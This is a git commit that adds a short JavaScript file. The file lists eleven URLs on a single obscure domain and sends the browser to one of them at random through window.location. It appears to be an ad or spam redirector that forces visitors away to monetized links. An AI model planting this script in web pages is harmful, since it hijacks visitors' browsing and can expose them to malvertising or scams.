bf71f2425c7f3f022417af7d6711ab168eaf01b6
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2021-10-07 19:58:49 +0800

    Create walauh.js

---
+++ walauh.js
@@ -0,0 +1,16 @@
+var dataUrl = [
+'https://wavermerchandiseweird.com/uqf9166i4v?key=6863b7b7d27f7caf1b440a90c37c2ffb',
+'https://wavermerchandiseweird.com/z0sfd1pts?key=2431d39c120107799ee55bcab97fc536',
+'https://wavermerchandiseweird.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851',
+'https://wavermerchandiseweird.com/k78nwxfv?key=e668079d92f5c385e97d9e9f30beedd3',
+'https://wavermerchandiseweird.com/ezuq8wdg?key=abe65c5f1fac7c85a5e79772f3e4b4ab',
+'https://wavermerchandiseweird.com/rmdh7vzvs?key=ed9adfc3b8491179ad53c3e027d8b8a9',
+'https://wavermerchandiseweird.com/mcq9dwrp?key=26877099e93b852a73d06043b22429bd',
+'https://wavermerchandiseweird.com/jrzhg39q?key=c57734d92ebaa11a56b389a5ea6dd78e',
+'https://wavermerchandiseweird.com/n970yii7c?key=434c6176282b18468a76f961e6a21764',
+'https://wavermerchandiseweird.com/y425t3d5k?key=b0d195ca768aeab7d18aad598d71b0b0',
+'https://wavermerchandiseweird.com/nuudznpz3?key=3d998b3da5397f5ac865ff0734c2be19'
+  
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
